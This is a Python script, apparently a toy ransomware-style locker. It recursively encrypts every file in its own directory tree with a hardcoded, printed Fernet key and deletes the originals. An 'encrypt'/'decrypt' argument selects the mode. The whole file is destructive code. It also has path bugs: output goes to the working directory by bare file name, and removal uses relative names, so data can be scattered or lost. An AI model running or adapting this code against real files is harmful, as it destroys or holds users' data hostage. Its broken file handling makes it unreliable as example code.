from cryptography.fernet import Fernet, InvalidToken
import os
import sys


cipher = Fernet(b'zaISbakM1093kwUJjCLaO3yv2gg7DgN701Sy1UCBFsI=')
print("CIPHER", cipher)

def data_extractor(file_path: str) -> bytes:
    with open(file_path, 'rb') as file:
        file_data = file.read()
        if len(file_data) < 1:
            return None
        return file_data


def encrypt_files(path: str):
    for item in os.listdir(path):
        full_path = os.path.join(path, item)

        if os.path.isfile(full_path):
            if full_path == os.path.abspath(__file__):
                continue        

            file_data = data_extractor(full_path.encode(encoding='utf-8'))
            if file_data is None:   
                continue

            encrypted_data = cipher.encrypt(file_data)
            try:
                with open(item + '.encrypted', 'wb') as file:
                    file.write(encrypted_data)
                    os.remove(full_path)
            except Exception as exc:
                raise exc
            
        elif os.path.isdir(full_path):
            encrypt_files(full_path)
        

def decrypt_files(path: str):
    for item in os.listdir(path):
        full_path = os.path.join(path, item)
        if os.path.isfile(full_path) and full_path.endswith('.encrypted'):
            file_data = data_extractor(full_path)
            if file_data:
                try:
                    decrypted_data = cipher.decrypt(file_data)
                    with open(full_path.replace('.encrypted', '', -1), 'wb') as file:
                        file.write(decrypted_data)
                    os.remove(item)
                except InvalidToken:
                    print(f"Decryption failed for {full_path}: Invalid token or file was altered.")
        elif os.path.isdir(full_path):
            decrypt_files(full_path)


if __name__ == '__main__':
    default_path = os.path.dirname(os.path.realpath(__file__))    
    if sys.argv[1] == 'decrypt':
        decrypt_files(default_path)
    elif sys.argv[1] == 'encrypt':
        encrypt_files(default_path)
